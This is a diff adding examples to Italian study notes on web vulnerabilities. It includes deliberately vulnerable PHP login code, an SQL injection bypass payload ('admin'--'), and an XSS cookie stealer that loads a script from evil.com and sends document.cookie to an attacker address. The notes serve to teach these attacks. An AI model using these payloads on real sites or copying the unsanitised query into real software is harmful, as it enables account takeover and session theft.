@@ -7,12 +7,49 @@ Invio di codice arbitrario all'applicazione, che viene eseguito lato server.
 Alcuni esempi tra i piú noti sono l'sql injection e il buffer overflow.
 
 É possibile peró evitare attacchi di questo tipo "sanificando" l'input dell'utente.
+### Esempio: SQL-injection, authentication bypass
+Immaginiamo di avere su una pagina web PHP un form di login, richiedente username e password per l'accesso ad una dashboard. La pagina effettua una richiesta al database relazionale direttamete o si interfaccia con un controller per chiedere se i dati inseriti sono corretti.
+
+Immaginiamo che la query sia 
+```php
+$username = $_POST['user'];
+$password = $_POST['password'];
+$query -> "select * from users where username='$username' and password='$password'";
+```
+notiamo che non viene fatta alcun controllo sull input, quindi un'attaccante é in grado di bypassare l'autenticazione con una semplice richiesta web con payload
+```
+user=admin'--
+```
+> Si suppone che esista l'utente admin e che la logica del codice PHP restante implementi il login.
 ## 2. XSS - Cross site scripting
 Uno script può essere eseguito sul Browser della vittima, facendo in modo che i parametri del Browser relativi al sito target (in particolare I cookies) vengano intercettati.
 
 Si dividono in due categorie: 
 - **reflected XSS**: quello sopra descritto
 - **stored XSS**: quando un'applicazione riceve un'input malevolo e lo include nelle risposte HTTP future in una faniera non sicura[1](https://portswigger.net/web-security/cross-site-scripting/stored)
+### Esempio: Reflected XSS - Cookie stealer con phising
+Immaginiamo che un sito abbia una form per i contatti, dove é possibile inserire il link al proprio sito.
+
+La richiesta di contatto viene renderizzata dal browser sul pannello amministratore in un tag HTML *p* senza essere sanitizzato, come segue
+```html
+<!-- site=http://input-site.com -->
+<p>Site: http://input-site.com</p>
+```
+Un attaccante puó quindi inserire codice javascript che viene eseguito dal browser.
+```html
+<!-- site=<script>alert(1)</script> -->
+<p><script>alert(1)</script></p>
+```
+Si puó inoltre allegare una richiesta a un file js di nostro possesso, mettere in ascolto una reverse-shell e far effettuare la richiesta dal browser dell'attaccante(anche se finiremo nella sandbox del browser) oppure rubare il cookie dell'utente che visualizzerá la pagina:
+```html
+<p><script src="http://evil.com/pwn.js"></script></p>
+```
+```js
+//pwn.js
+var i=new Image;
+i.src="http://evil-ip:/?"+document.cookie;
+```
+mettendo in ascolto un server HTTP per ricevere la richiesta.
 ## 3. Broken Authentication & session management
 **Broken autentication**: l’autenticazione utente viene resa vana, ovvero un utente non autorizzato riesce ad autenticarsi.
 **Broken Session management**: un utente non autorizzato riesce ad inserirsi all’interno di una sessione di un utente autorizzato.
